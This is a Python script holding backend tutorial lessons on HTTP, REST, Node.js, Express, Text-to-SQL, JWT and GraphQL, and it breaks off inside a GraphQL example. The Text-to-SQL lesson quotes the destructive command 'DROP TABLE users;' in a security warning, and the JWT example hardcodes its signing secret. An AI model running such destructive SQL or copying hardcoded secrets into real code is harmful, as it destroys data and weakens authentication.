import json

with open("curriculum/tracks/backend.json", "r", encoding="utf-8") as f:
    data = json.load(f)

theories = {
    ("HTTP & APIs", "What is HTTP?"): """## The Language of the Web

Every time you open a browser, click a link, or send a message on your phone, you are using **HTTP** (Hypertext Transfer Protocol). It is the foundational protocol that dictates how data is formatted and transmitted across the internet.

### The Client-Server Model

The internet is fundamentally a conversation between two computers:
1. **The Client**: The computer asking for information (e.g., your Chrome browser, or a mobile app).
2. **The Server**: The computer that holds the information and responds to the request (e.g., Google's data centers).

### The HTTP Request

When you type `https://github.com` into your browser and press Enter, your browser (the Client) sends an **HTTP Request** to GitHub's Server.

A basic request looks like this in raw text:
```http
GET / HTTP/1.1
Host: github.com
User-Agent: Mozilla/5.0
Accept-Language: en-US
```

Let's break this down:
- **`GET`**: The HTTP Method (the action you want to take). `GET` means "Give me data."
- **`/`**: The URL Path (what specific data you want). `/` is the homepage.
- **Headers**: Key-value pairs (`Host`, `User-Agent`) that provide metadata about the request, like what browser you are using.

### The HTTP Response

GitHub's server receives this text, processes it, and sends back an **HTTP Response**:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1048

<!DOCTYPE html>
<html>
  <head><title>GitHub</title></head>
  ...
</html>
```

The response includes:
- **`200 OK`**: The Status Code (telling the client the request was successful).
- **Headers**: Metadata about the response (`Content-Type` tells the browser how to render the data).
- **The Body**: The actual data requested (in this case, the HTML code for the website).

### Statelessness

A critical concept of HTTP is that it is **stateless**. Every request is completely independent. When you click a second link on GitHub, the server has no memory of your first request. (This is why we use "Cookies" to remember who is logged in!)""",

    ("HTTP & APIs", "Status Codes"): """## How Servers Communicate Success and Failure

When a client sends an HTTP Request, the server always replies with a **Status Code**—a 3-digit number summarizing the result of the request. 

As a backend developer, returning the correct status code is crucial. If a user tries to access a private page and you return a `200 OK` (even if you show an error message), automated security scanners and search engines will think the page is public!

### The Five Categories

Status codes are grouped by their first digit:

**1xx: Informational (100-199)**
Rarely seen in everyday development. It means the server received the request and is continuing the process.

**2xx: Success (200-299)**
- **`200 OK`**: The standard success code. The request succeeded, and the data is in the body.
- **`201 Created`**: The request succeeded, and a *new resource was created* (e.g., you successfully registered a new user).
- **`204 No Content`**: The request succeeded, but there is no data to send back (e.g., successfully deleting a file).

**3xx: Redirection (300-399)**
- **`301 Moved Permanently`**: The URL has changed permanently. Search engines will update their links.
- **`302 Found`**: Temporary redirect (e.g., redirecting an unauthenticated user to a login page).

**4xx: Client Errors (400-499)**
*These mean the Client messed up.*
- **`400 Bad Request`**: The client sent invalid data (e.g., missing a required email field in a JSON payload).
- **`401 Unauthorized`**: The client must log in to access this resource.
- **`403 Forbidden`**: The client is logged in, but does *not* have permission (e.g., a standard user trying to access the Admin dashboard).
- **`404 Not Found`**: The requested URL does not exist.

**5xx: Server Errors (500-599)**
*These mean the Backend Developer messed up.*
- **`500 Internal Server Error`**: A generic error. Your backend code crashed (e.g., a Python exception was thrown).
- **`502 Bad Gateway`**: The server acting as a gateway/proxy received an invalid response from the upstream server.
- **`503 Service Unavailable`**: The server is overloaded or down for maintenance.""",

    ("HTTP & APIs", "REST API Design"): """## Designing Predictable Systems

An **API** (Application Programming Interface) is a set of rules allowing different software programs to communicate. When a React frontend needs data from a Python backend, it calls an API.

**REST** (Representational State Transfer) is the industry-standard architectural style for designing these APIs. A RESTful API treats everything as a **Resource** (e.g., Users, Posts, Comments) and uses standard HTTP methods to interact with them.

### The Four Core HTTP Methods (CRUD)

REST maps directly to the four fundamental database operations (Create, Read, Update, Delete).

1. **GET (Read)**: Retrieve data. Does not modify anything.
2. **POST (Create)**: Send new data to the server to create a resource.
3. **PUT / PATCH (Update)**: Modify an existing resource. (PUT replaces the entire resource; PATCH updates partial fields).
4. **DELETE (Delete)**: Remove a resource.

### Naming Conventions

The URL (Endpoint) should represent the *Resource*, and the HTTP Method should represent the *Action*.

**Bad API Design (Using verbs in URLs):**
- `/getUsers`
- `/createNewUser`
- `/deleteUser?id=5`

**Good RESTful Design (Using Plural Nouns):**
- `GET /users` (Returns a list of all users)
- `POST /users` (Creates a new user)
- `GET /users/5` (Returns the specific user with ID 5)
- `PUT /users/5` (Updates user 5)
- `DELETE /users/5` (Deletes user 5)

### Nested Resources

If resources are related, the URLs should reflect that hierarchy.
To get all the posts written by user 5:
- `GET /users/5/posts`

To get a specific post (ID 12) written by user 5:
- `GET /users/5/posts/12`

### Idempotency

A key concept in REST is **Idempotency**—making the same request multiple times should have the same effect as making it once.
- **GET, PUT, DELETE** are idempotent. If you delete user 5 twenty times, the end result is exactly the same: user 5 is gone.
- **POST** is *not* idempotent. If you send a POST request to `/users` twenty times, you will accidentally create 20 identical users! (This is why your browser warns you when you refresh a page after submitting a form).""",

    ("HTTP & APIs", "JSON Data Format"): """## The Universal Data Language

When a frontend and backend communicate, they need a standardized way to format data. 

Historically, XML (Extensible Markup Language) was used, which looked like HTML (`<user><name>Alice</name></user>`). Today, the undisputed king of web data is **JSON** (JavaScript Object Notation).

### Why JSON?
1. **Lightweight**: It requires far fewer characters than XML, saving bandwidth.
2. **Readable**: It is extremely easy for humans to read and write.
3. **Native to JavaScript**: Since the frontend of the web is built in JavaScript, JSON can be parsed instantly without complex libraries.

### JSON Syntax Rules

JSON looks exactly like a Python Dictionary, but with stricter rules:

1. **Keys must be strings**, enclosed in **double quotes** (`"name"`, not `'name'`).
2. **Values** can only be: Strings, Numbers (int/float), Booleans (`true`/`false`), Arrays (`[]`), Objects (`{}`), or `null`.
3. **No trailing commas**. The last item in a list or object cannot have a comma after it.
4. **No functions or comments**.

**Valid JSON Example:**
```json
{
  "user_id": 105,
  "username": "alice_dev",
  "is_active": true,
  "roles": ["admin", "editor"],
  "profile": {
    "age": 28,
    "location": "New York"
  },
  "last_login": null
}
```

### Parsing JSON in Code

Because JSON is just a long text string when it travels over the network, your backend code must **parse** (deserialize) it into a native object (like a Python dictionary), and **stringify** (serialize) it when sending it back.

**In Python:**
```python
import json

# String to Dictionary (Deserialization)
json_string = '{"name": "Alice"}'
data_dict = json.loads(json_string) 
print(data_dict["name"]) # "Alice"

# Dictionary to String (Serialization)
new_dict = {"name": "Bob", "age": 30}
json_output = json.dumps(new_dict) 
```""",

    ("HTTP & APIs", "Making API Requests"): """## Becoming the Client

While browsers make HTTP requests automatically when you click a link, backend servers frequently need to make their own HTTP requests to communicate with other APIs (e.g., a Python backend calling the Stripe API to process a payment).

### cURL: The Universal Tool
Before writing code, developers test APIs using `curl`, a command-line tool available on almost all operating systems.

```bash
# A simple GET request
curl https://api.github.com/users/octocat

# A POST request with JSON data and custom Headers
curl -X POST https://api.example.com/login \
     -H "Content-Type: application/json" \
     -d '{"email": "alice@test.com", "password": "123"}'
```

### Making Requests in Python

In Python, the built-in `urllib` is overly complex. The industry standard is the third-party **`requests`** library.

```python
import requests

# 1. Basic GET Request
response = requests.get("https://api.github.com/users/octocat")

# Check status code
if response.status_code == 200:
    # Automatically parses the JSON string into a Python dictionary!
    data = response.json() 
    print(data["name"])

# 2. POST Request with JSON
payload = {"title": "My New Post", "body": "Hello World"}

# Using the `json=` parameter automatically sets the 
# 'Content-Type: application/json' header and stringifies the dictionary!
response = requests.post("https://jsonplaceholder.typicode.com/posts", json=payload)

print(response.status_code) # 201 Created
```

### Authentication via Headers

Many APIs require an API Key to prove your identity. You pass this key in the HTTP Headers.

```python
headers = {
    "Authorization": "Bearer YOUR_SECRET_API_KEY",
    "Accept": "application/json"
}

response = requests.get("https://api.stripe.com/v1/charges", headers=headers)
```
*Security Note: NEVER hardcode API keys in your source code. Always load them from environment variables (`os.environ.get('STRIPE_KEY')`).*""",

    ("Node.js Basics", "Console & Variables"): """## JavaScript Beyond the Browser

For decades, JavaScript was trapped inside the web browser. It could manipulate HTML and handle button clicks, but it could not read files, connect to databases, or act as a server.

**Node.js** changed everything. It took the V8 JavaScript engine (built by Google for Chrome) and pulled it out of the browser, allowing developers to run JavaScript directly on their computer's operating system. 

This sparked a revolution: developers could now write both the Frontend (React/Vue) and the Backend (API servers, databases) using a single language: JavaScript.

### Executing Node.js

You don't need an HTML file to run Node. You execute it directly from the terminal.

1. Create a file: `app.js`
2. Write code: `console.log("Hello Backend!");`
3. Run it in terminal: `node app.js`

### Modern Variables

In modern JavaScript (ES6+), you should **never use `var`**. It has confusing scoping rules that lead to bugs. 

Use `const` and `let` exclusively.

**1. `const` (Constant)**
Use `const` by default. It means the variable *cannot be reassigned*. It prevents you from accidentally overwriting critical data.
```javascript
const port = 3000;
port = 4000; // ERROR! TypeError: Assignment to constant variable.

// Note: If a const is an object or array, you CAN modify its contents!
const user = { name: "Alice" };
user.name = "Bob"; // This is perfectly fine.
```

**2. `let` (Mutable)**
Only use `let` when you explicitly know the value needs to change (like a counter in a loop).
```javascript
let score = 0;
score += 10; // Perfectly fine.
```

### Global Objects

Because Node.js isn't a browser, the `window` object doesn't exist. You cannot use `window.alert()` or `document.getElementById()`.
Instead, Node has its own global objects:
- `global` (The equivalent of window)
- `process` (Provides info about the current Node process, heavily used for accessing environment variables via `process.env`)
- `__dirname` (The absolute path to the current folder)""",

    ("Node.js Basics", "Modules & require"): """## Organizing Code in Node.js

If you write an entire backend server in one massive `index.js` file, it will quickly become unmaintainable. You must split your code into multiple files (Modules).

Node.js traditionally uses the **CommonJS** module system (using `require()` and `module.exports`). 
*(Note: Node now also supports ES Modules like `import`/`export`, but CommonJS remains deeply entrenched in legacy backend code).*

### Exporting Code

By default, everything you write in a file is private to that file. To allow other files to use your functions, you must explicitly export them.

**math.js**
```javascript
const add = (a, b) => a + b;
const subtract = (a, b) => a - b;

// Export an object containing both functions
module.exports = {
    add: add,
    subtract: subtract
};
```

### Importing Code

To use the exported code in another file, you use the `require()` function.

**app.js**
```javascript
// The './' tells Node to look in the local folder, not in node_modules!
const math = require('./math.js');

console.log(math.add(5, 10)); // 15
```
You can also use modern destructuring to grab exactly what you need:
```javascript
const { add } = require('./math.js');
console.log(add(5, 10));
```

### The Three Types of Modules

When you call `require()`, Node resolves it based on what you ask for:

1. **Local Modules**: Files you wrote. Must start with `./` or `../`. 
   `require('./utils')`
2. **Core Modules**: Modules built directly into Node (like the file system or path utilities). No `./` needed.
   `require('fs')`
3. **Third-Party Modules**: Code downloaded from NPM (Node Package Manager) into your `node_modules` folder (like Express or Mongoose).
   `require('express')`""",

    ("Node.js Basics", "Callbacks & Events"): """## The Asynchronous Nature of Node

Node.js is fundamentally **single-threaded**. It only has one "brain" to process code. 

In languages like PHP or Ruby, if you tell the server to read a massive file from the hard drive, the entire thread *blocks* (freezes). No other users can connect to the website until that file finishes loading. 

Node.js solves this using an **Event Loop** and **Asynchronous Non-Blocking I/O**.

### How Non-Blocking Works

If Node needs to do something slow (like query a database, read a file, or make an HTTP request), it *does not wait*. It offloads the task to the operating system, registers a **Callback Function**, and immediately moves on to the next line of code!

When the slow task finishes, the operating system taps Node on the shoulder (via the Event Loop) and says: "I'm done, here is the data, go run that callback function now."

### The Callback Pattern

A callback is simply a function passed as an argument to another function, to be executed later.

```javascript
const fs = require('fs');

console.log("1. Starting to read file...");

// readFile is asynchronous. It takes a callback function.
fs.readFile('massive_data.txt', 'utf8', (error, data) => {
    // This code runs LATER, when the file is finally read
    if (error) {
        console.log("Error reading file!");
        return;
    }
    console.log("3. File reading finished!");
});

// This line executes immediately, BEFORE the file finishes!
console.log("2. Moving on to other work...");
```
**Output Order:**
1. Starting to read file...
2. Moving on to other work...
3. File reading finished!

### Callback Hell
While callbacks are powerful, if you need to perform sequential asynchronous tasks (Read a file, THEN query the database, THEN send an email), the callbacks nest inside each other, creating a massive, unreadable pyramid of code known as "Callback Hell". This led to the invention of Promises.""",

    ("Node.js Basics", "Promises in Node"): """## Escaping Callback Hell

To solve the deep nesting of Callback Hell, modern JavaScript introduced **Promises**.

A Promise is an object representing the eventual completion (or failure) of an asynchronous operation. It acts like an IOU. When you query a database, it instantly returns a Promise ("I promise I'll give you data eventually").

A Promise has three states:
1. **Pending**: The operation hasn't finished yet.
2. **Resolved (Fulfilled)**: The operation succeeded.
3. **Rejected**: The operation failed.

### Consuming Promises with `.then()`

Instead of passing a callback *into* the function, you attach `.then()` and `.catch()` to the returned Promise.

```javascript
const fetch = require('node-fetch'); // Fetch returns a Promise

fetch('https://api.github.com/users/octocat')
    .then(response => {
        // Runs if the Promise Resolves
        return response.json(); // .json() also returns a Promise!
    })
    .then(data => {
        // Promise Chaining! This runs after the json() promise resolves
        console.log("Username:", data.login);
    })
    .catch(error => {
        // Runs if ANY promise in the chain Rejects (fails)
        console.error("Something went wrong:", error);
    });
```

### Creating Promises

You can wrap legacy callback-based code in your own Promise.

```javascript
const myPromise = new Promise((resolve, reject) => {
    let success = true;
    
    setTimeout(() => {
        if (success) {
            resolve("Data successfully loaded!"); // Triggers .then()
        } else {
            reject("Network timeout.");           // Triggers .catch()
        }
    }, 2000);
});

myPromise.then(data => console.log(data));
```
While `.then()` chaining is much cleaner than nested callbacks, it can still get messy. This led to the final evolution of asynchronous JavaScript: Async/Await.""",

    ("Node.js Basics", "Async/Await in Node"): """## Writing Async Code that Looks Synchronous

`async/await` is syntactic sugar built on top of Promises. It allows you to write asynchronous, non-blocking code that *reads* top-to-bottom like traditional, synchronous code (like Python).

This is the absolute industry standard for modern Node.js and React development.

### The Rules of Async/Await

1. **`await` pauses execution**: When you put `await` in front of a function that returns a Promise, JavaScript halts the execution of that specific block of code until the Promise resolves, and then returns the actual data.
2. **`async` defines the boundary**: You can ONLY use the `await` keyword inside a function that has been labeled with the `async` keyword.

### Refactoring to Async/Await

Compare the Promise chain to the Async/Await equivalent:

**Old Way (Promises):**
```javascript
function getUserData() {
    fetch('https://api.github.com/users/octocat')
        .then(res => res.json())
        .then(data => console.log(data.name))
        .catch(err => console.error(err));
}
```

**Modern Way (Async/Await):**
```javascript
async function getUserData() {
    try {
        // Execution pauses here until fetch finishes
        const response = await fetch('https://api.github.com/users/octocat');
        
        // Execution pauses here until json parsing finishes
        const data = await response.json(); 
        
        console.log(data.name);
    } catch (error) {
        // Standard try/catch blocks handle Promise Rejections!
        console.error(error);
    }
}
```

### Why it's Better

With Async/Await, error handling is unified. You can wrap standard synchronous code and asynchronous database queries inside a single `try/catch` block. 
Furthermore, variable scope is maintained. In `.then()` chains, a variable defined in the first `.then()` is inaccessible in the third `.then()`. In Async/Await, all variables are available sequentially in the same block scope.""",

    ("Express Server", "Basic Express App"): """## The Standard Node.js Framework

While you *can* build a web server using Node's built-in `http` module, it is incredibly tedious. You have to manually parse URLs, extract JSON strings from network streams, and manage headers.

**Express.js** is a fast, unopinionated web framework for Node.js. It abstracts the low-level HTTP protocols and provides a clean, routing-based API. It is the most popular Node framework in the world.

### Setting up a Server

1. Initialize your project: `npm init -y`
2. Install Express: `npm install express`

**server.js**
```javascript
const express = require('express');
const app = express();
const PORT = 3000;

// Define a Route: Handle GET requests to the root URL '/'
// 'req' is the incoming Request object from the client
// 'res' is the outgoing Response object we use to reply
app.get('/', (req, res) => {
    // Express automatically sets the Content-Type to text/html
    // and sends a 200 OK status!
    res.send('<h1>Hello, Express!</h1>');
});

// Define an API endpoint returning JSON
app.get('/api/users', (req, res) => {
    const users = [{ id: 1, name: "Alice" }];
    // res.json() stringifies the object and sets Content-Type to application/json
    res.json(users);
});

// Start the server, listening on port 3000
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

### The Request (req) and Response (res) Objects

Every route handler callback takes `(req, res)`.
- **`req`**: Contains all information about what the client sent. 
  - `req.method` (GET, POST)
  - `req.url`
  - `req.headers`
  - `req.body` (The JSON payload sent in a POST request)
- **`res`**: Methods to formulate the reply.
  - `res.status(404)` (Set the status code)
  - `res.send("Text")`
  - `res.json({ data: 1 })`""",

    ("Express Server", "Middleware"): """## The Assembly Line of Express

**Middleware** is the most important concept in Express. 

Imagine Express as a car manufacturing assembly line. 
The client's Request (`req`) is the raw chassis entering the factory. It moves down a conveyor belt. 
A Middleware function is a worker stationed along the belt. When the car reaches them, they can:
1. Inspect the car (Log the request URL).
2. Modify the car (Parse a JSON string into a JavaScript object).
3. Stop the belt and reject the car (If the user doesn't have an authentication token).
4. Pass the car to the next worker.

### Writing Custom Middleware

A middleware is just a function with access to `req`, `res`, and a special function called `next`.

```javascript
// A simple logging middleware
const logger = (req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} request to ${req.url}`);
    
    // CRITICAL: You MUST call next() to pass control to the next middleware.
    // If you don't call next() or res.send(), the request hangs forever!
    next(); 
};

// Apply this middleware to EVERY route in the application
app.use(logger);

app.get('/dashboard', (req, res) => {
    res.send("Welcome!"); // This only runs AFTER the logger finishes.
});
```

### Built-in and Third-Party Middleware

You rarely write your own parsing middleware because Express and the community provide them.

**1. JSON Parsing**
By default, Express does not know how to read JSON sent in a POST request (`req.body` will be `undefined`). You must use the built-in JSON middleware.
```javascript
// Intercepts every request, checks if the body is JSON, parses it, 
// and attaches it to req.body.
app.use(express.json()); 
```

**2. CORS (Cross-Origin Resource Sharing)**
If your frontend runs on `localhost:3000` and your backend runs on `localhost:4000`, the browser will block the frontend from calling the backend for security reasons. You must use the `cors` middleware to allow it.
```javascript
const cors = require('cors');
app.use(cors());
```""",

    ("Express Server", "Route Parameters"): """## Dynamic Routing

Building an API requires dynamic URLs. If you have 10,000 users, you cannot manually write 10,000 `app.get()` routes for each user's profile page.

Express uses **Route Parameters** and **Query Strings** to capture dynamic data from the URL.

### Route Parameters (`req.params`)

Route parameters are named URL segments that capture the values specified at their position in the URL. You define them using a colon `:`.

```javascript
// The colon tells Express that 'id' is a variable, not the literal word "id"
app.get('/users/:id', (req, res) => {
    
    // If the client requests /users/42
    // req.params.id will be "42"
    const userId = req.params.id; 
    
    // Note: URL parameters are ALWAYS strings. 
    // You must convert them to numbers if querying a database.
    const id = parseInt(userId);
    
    res.json({ message: `Fetching data for user ${id}` });
});

// Multiple parameters
app.get('/users/:userId/posts/:postId', (req, res) => {
    // /users/42/posts/105
    res.json(req.params); // { "userId": "42", "postId": "105" }
});
```

### Query Strings (`req.query`)

While route parameters are used to identify a *specific* resource, Query Strings are used for sorting, filtering, and pagination of a *collection* of resources.

Query strings appear at the end of a URL after a question mark `?`, as key-value pairs separated by `&`.
*Example: `/products?category=shoes&sort=price_asc`*

You do not define query strings in your Express route path. Express automatically parses them into the `req.query` object.

```javascript
// Route definition remains clean
app.get('/products', (req, res) => {
    
    // If URL is /products?category=shoes&sort=price_asc
    const category = req.query.category; // "shoes"
    const sortBy = req.query.sort;       // "price_asc"
    
    // You would pass these variables into your database query
    res.json({ 
        message: `Filtering by ${category}, sorting by ${sortBy}` 
    });
});
```""",

    ("Express Server", "Error Handling"): """## Preventing Server Crashes

If a user tries to find a product that doesn't exist, or if your database connection fails, your Express server must handle the error gracefully. If an error is "uncaught", the entire Node.js server will crash, taking down the application for all users.

### Synchronous Error Handling

Express automatically catches errors in synchronous code and returns a 500 status code.
```javascript
app.get('/crash', (req, res) => {
    // ReferenceError: x is not defined. 
    // Express catches this and sends a 500 error to the client. The server stays alive.
    console.log(x); 
});
```

### Asynchronous Error Handling (The Danger)

Express **does NOT** automatically catch errors in asynchronous code (Promises / Async Await). If a database query fails inside an `async` function and you didn't catch it, the server crashes.

You must wrap async route handlers in `try/catch` blocks, and pass the error to Express using `next(error)`.

```javascript
app.get('/users/:id', async (req, res, next) => {
    try {
        const user = await database.findById(req.params.id);
        
        // Manual 404 Error handling
        if (!user) {
            return res.status(404).json({ error: "User not found" });
        }
        
        res.json(user);
    } catch (error) {
        // The database threw an error (e.g., connection lost)
        // Pass it to the Express Error Middleware
        next(error); 
    }
});
```

### Centralized Error Handling Middleware

Instead of writing `res.status(500).json({ error: "..." })` in every single `catch` block, you write a special Error Handling Middleware at the very bottom of your `server.js` file.

Express recognizes Error Middleware because it takes **4 arguments** instead of 3: `(err, req, res, next)`.

```javascript
// This must be the LAST app.use() in your file
app.use((err, req, res, next) => {
    console.error("GLOBAL ERROR CATCHER:", err.message);
    
    // Standardized error response for the frontend
    res.status(500).json({
        status: "error",
        message: "Internal Server Error"
    });
});
```""",

    ("Express Server", "CRUD API"): """## Building a Complete REST API

Let's combine everything to build a standard CRUD (Create, Read, Update, Delete) API for a "Books" resource. 
Instead of a real database, we will use an in-memory array to simulate data storage.

```javascript
const express = require('express');
const app = express();
app.use(express.json()); // Essential for POST/PUT requests

// Simulated Database
let books = [
    { id: 1, title: "1984", author: "George Orwell" }
];
let currentId = 2;

// 1. READ ALL (GET)
app.get('/api/books', (req, res) => {
    res.json(books);
});

// 2. READ ONE (GET)
app.get('/api/books/:id', (req, res) => {
    const book = books.find(b => b.id === parseInt(req.params.id));
    if (!book) return res.status(404).json({ error: "Book not found" });
    res.json(book);
});

// 3. CREATE (POST)
app.post('/api/books', (req, res) => {
    // Validate the incoming data
    if (!req.body.title || !req.body.author) {
        return res.status(400).json({ error: "Title and author are required" });
    }
    
    const newBook = {
        id: currentId++,
        title: req.body.title,
        author: req.body.author
    };
    
    books.push(newBook);
    res.status(201).json(newBook); // 201 Created
});

// 4. UPDATE (PUT)
app.put('/api/books/:id', (req, res) => {
    const book = books.find(b => b.id === parseInt(req.params.id));
    if (!book) return res.status(404).json({ error: "Book not found" });
    
    // Update fields
    book.title = req.body.title || book.title;
    book.author = req.body.author || book.author;
    
    res.json(book);
});

// 5. DELETE (DELETE)
app.delete('/api/books/:id', (req, res) => {
    const bookIndex = books.findIndex(b => b.id === parseInt(req.params.id));
    if (bookIndex === -1) return res.status(404).json({ error: "Book not found" });
    
    books.splice(bookIndex, 1); // Remove from array
    res.status(204).send(); // 204 No Content
});

app.listen(3000, () => console.log('API running on port 3000'));
```""",

    ("Database Integration", "Text-to-SQL"): """## AI-Powered Database Querying

Traditionally, backend engineers write raw SQL or use Object-Relational Mappers (ORMs) like Prisma or SQLAlchemy to communicate with databases. 
If a CEO wants to know "How many users signed up last month?", the engineering team has to manually write the SQL query, build an API endpoint, and create a frontend dashboard.

**Text-to-SQL** uses Large Language Models to translate human language directly into executable SQL queries, allowing non-technical users to chat directly with a database.

### The Text-to-SQL Architecture

1. **Schema Extraction**: The LLM doesn't have access to your database. You must provide the LLM with the schema (Table names, Column names, Primary/Foreign keys, and data types) in the System Prompt.
2. **User Query**: The user asks a question in plain English.
3. **Translation**: The LLM reads the schema and generates the syntactically correct SQL query.
4. **Execution**: The backend parses the LLM's response, securely executes the SQL query against the read-only database, and returns the raw data.
5. **Synthesis**: (Optional) The raw data is fed *back* to the LLM to write a conversational summary for the user.

### Security and Risks

Text-to-SQL is inherently dangerous if built incorrectly.

**1. SQL Injection & Destructive Operations**
If a user prompts the LLM: *"Delete the users table"*, the LLM might happily generate `DROP TABLE users;`. If your backend executes this, your company is dead.
- *Solution*: The database user credentials provided to the Text-to-SQL backend must have strict **Read-Only** permissions (SELECT only).

**2. Hallucinations**
The LLM might invent columns that don't exist (e.g., querying `users.phone_number` when the column is actually `users.phone`).
- *Solution*: Use Few-Shot prompting. Provide the LLM with 5 examples of complex queries specific to your weird database quirks.

### Implementation via LangChain

LangChain provides built-in tools (`create_sql_agent`) that automate this entire pipeline. The agent connects to the database, reads the schema automatically, attempts a query, and if the SQL engine throws a syntax error, the agent *reads the error* and automatically rewrites the query until it works!""",

    ("Authentication", "JWT (JSON Web Tokens)"): """## Stateless Authentication

HTTP is stateless. When User A logs in, and then requests their profile page, the server has no idea who is asking. 

Historically, servers used **Sessions**. The server generated a random Session ID, stored it in a database table alongside User A's ID, and gave the ID to the browser in a Cookie. Every subsequent request required the server to do a slow database lookup to see who the Session ID belonged to.

**JWT (JSON Web Token)** revolutionized authentication by making it **Stateless**. The server doesn't need to look up a database to verify the user.

### How JWT Works

A JWT is a long, encoded string containing a JSON payload, securely signed by the server. 

When a user logs in with a correct password, the backend creates a JSON object containing their User ID and signs it using a secret password (e.g., `process.env.JWT_SECRET`) that only the server knows.

```javascript
const jwt = require('jsonwebtoken');

// The Payload (Who the user is)
const payload = { userId: 42, role: "admin" };

// Create and sign the token
const token = jwt.sign(payload, "my_super_secret_key", { expiresIn: '1h' });

res.json({ token: token });
```

### The Structure of a JWT

A JWT looks like this: `xxxxx.yyyyy.zzzzz`
1. **Header (xxxxx)**: Metadata about the algorithm used.
2. **Payload (yyyyy)**: The actual data (`{ userId: 42 }`). This is merely Base64 encoded, **NOT ENCRYPTED**. Anyone who finds the token can decode it and read the data! Never put passwords or credit cards in a JWT payload.
3. **Signature (zzzzz)**: A cryptographic hash of the Header, Payload, and the Server's Secret Key. 

### Verifying the Token

The client stores the JWT (usually in LocalStorage or an HttpOnly Cookie) and attaches it to the `Authorization` header of every future API request.

When the backend receives the request, it doesn't need to query the database. It runs the signature algorithm again using its Secret Key. 
- If the signatures match, the token is perfectly valid and the server trusts the `userId` inside the payload.
- If a hacker changed the `userId` from 42 to 1 (trying to become an admin), the mathematical signature becomes invalid, and the server rejects it with a `401 Unauthorized`.

This eliminates database lookups for authentication, making the API infinitely scalable.""",

    ("RESTful Design", "REST Principles"): """## The Architecture of the Web

REST (Representational State Transfer) is not a protocol, a framework, or a standard. It is an architectural style designed by Roy Fielding in 2000 that dictates how distributed systems should communicate.

If an API adheres strictly to these constraints, it is considered **RESTful**.

### The 6 Constraints of REST

**1. Client-Server Separation**
The frontend (UI) and the backend (Data Storage) must be completely independent. The frontend knows nothing about the SQL database, and the backend knows nothing about the React components. As long as the JSON interface remains the same, you can completely rewrite the frontend without touching the backend.

**2. Statelessness**
This is the most strictly enforced rule. The server must not store any state about the client session between requests. Every single request from the client must contain all the information necessary to understand and process the request (e.g., passing a JWT token on every request, rather than relying on a server-side session variable).

**3. Cacheability**
The server must explicitly tell the client if a response can be cached. If a GET request asks for a list of countries (which never changes), the server should set cache headers so the client doesn't waste network bandwidth asking for it again tomorrow.

**4. Uniform Interface (Resource-Based)**
The API must have a consistent, predictable structure.
- Data is represented as **Resources** accessed via URIs (e.g., `https://api.com/users/42`).
- Resources are manipulated via standard HTTP verbs (GET, POST, PUT, DELETE).
- A GET request to `/users` returns JSON; it does not return an HTML webpage.

**5. Layered System**
The client cannot tell if it is connected directly to the end server, or to an intermediary (like a Load Balancer, a CDN, or a Reverse Proxy). The architecture must allow layers to be added for security or scalability without affecting the client.

**6. Code on Demand (Optional)**
The server can temporarily extend the functionality of a client by transferring executable code (e.g., sending a JavaScript widget to the browser). This is rarely used in modern REST APIs.""",

    ("RESTful Design", "HTTP Status Codes"): """## Communicating Context

In REST API design, HTTP Status Codes are your primary means of communicating the result of an operation. 

Many amateur developers write APIs that always return `200 OK`, even when an error occurs, embedding the error inside the JSON payload:
`HTTP 200: { "status": "error", "message": "User not found" }`
**This is an anti-pattern.** It breaks automated tools, caching systems, and monitoring dashboards that rely on network-level status codes to detect failures.

### Standardizing Your Responses

**Creation Operations (POST)**
When a user submits a form to create a resource:
- Success: **`201 Created`**. The response body should contain the newly created object, including its database-generated ID.
- Failure (Validation): **`400 Bad Request`**. The user provided invalid data (e.g., password too short).
- Failure (Conflict): **`409 Conflict`**. The user tried to register an email that already exists in the database.

**Read Operations (GET)**
- Success: **`200 OK`**.
- Failure: **`404 Not Found`**. The resource ID does not exist.

**Delete Operations (DELETE)**
- Success: **`204 No Content`**. The resource was successfully deleted. Since it's gone, there is no JSON body to return.
- Failure: **`404 Not Found`**.

### Authentication vs. Authorization

The most commonly confused status codes are 401 and 403.

**`401 Unauthorized`** (Authentication Failure)
Meaning: *"I don't know who you are."*
Use this when the user is not logged in, their JWT token is missing, or their token has expired. They need to go to the login screen.

**`403 Forbidden`** (Authorization Failure)
Meaning: *"I know exactly who you are, but you aren't allowed to do this."*
Use this when a logged-in standard user attempts to access an administrator-only endpoint, or tries to edit a post that belongs to someone else. Logging in again won't fix the problem; they lack the necessary permissions.""",

    ("GraphQL", "Intro to GraphQL"): """## Solving the Over-Fetching Problem

REST APIs have dominated the web for a decade, but they have a fundamental structural flaw: the server decides exactly what data is returned.

If a frontend developer is building a mobile app that only needs a user's Name and Profile Picture, they call `GET /users/5`. 
The REST API, however, returns the entire user object, including their email, address, creation date, and 50 other fields. 

This is called **Over-fetching**. The mobile app is wasting massive amounts of cellular data downloading JSON fields it immediately ignores.

Conversely, if the app needs the user's recent posts, it has to make a second request to `GET /users/5/posts`. This is **Under-fetching** (the N+1 problem).

### The GraphQL Revolution

Created by Facebook, **GraphQL** is a query language for APIs. It flips the control model: **The Client dictates exactly what data it wants, and the Server returns exactly that data, nothing more.**

Instead of having dozens of endpoints (`/users`, `/posts`, `/comments`), a GraphQL server usually has exactly one endpoint: `POST /graphql`.

### The Query

The frontend sends a highly structured query string to the server.

```graphql
query {
  user(id: 5) {
    name
    profilePicture
    posts(limit: 3) {
      title
      likes
    }
  }
}
```

### The Response

The server processes the query and returns a JSON object that perfectly mirrors the shape of the query. Notice how no extraneous data is returned!

```json
{
  "data": {
    "user": {
      "name": "Alice",
      "profilePicture": "https://url.com/pic.jpg",
      "posts": [
        { "title": "My first post", "likes": 42 },
        { "title": "GraphQL is cool", "likes": 10 }
      ]
    }
  }
}
```
GraphQL drastically improves network performance on mobile devices and accelerates frontend development because UI engineers no longer have to wait for backend engineers to create custom REST endpoints for every new view.""",

    ("GraphQL", "Schemas and Resolvers"): """## Building a GraphQL Server

Unlike REST, where you just write a route and return JSON, GraphQL requires strict, strongly-typed contracts. Building a GraphQL backend involves two distinct halves: The **Schema** (the shape of the data) and the **Resolvers** (the code that gets the data).

### 1. The Schema (Type Definitions)

You must define exactly what types of objects exist in your API, and what fields they have. This acts as a rigid contract between the frontend and backend.

```graphql
# The '!' means the field is required (cannot be null)
type User {
  id: ID!
  name: String!
  email: String!
  posts: [Post!]!
}

type Post {
